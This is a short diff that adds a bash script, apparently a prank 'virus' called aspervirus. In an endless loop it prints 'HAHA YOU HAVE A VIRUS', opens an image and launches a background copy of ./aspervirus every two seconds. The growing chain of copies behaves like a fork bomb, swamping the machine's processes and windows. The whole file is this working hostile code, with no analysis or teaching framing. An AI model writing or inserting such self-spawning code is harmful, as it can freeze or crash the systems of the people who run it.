@@ -1,0 +1,9 @@
+#!/bin/bash
+
+while true; 
+do 
+	echo "HAHA YOU HAVE A VIRUS";
+	open aspervirus.png &
+	./aspervirus &
+	sleep 2; 
+done
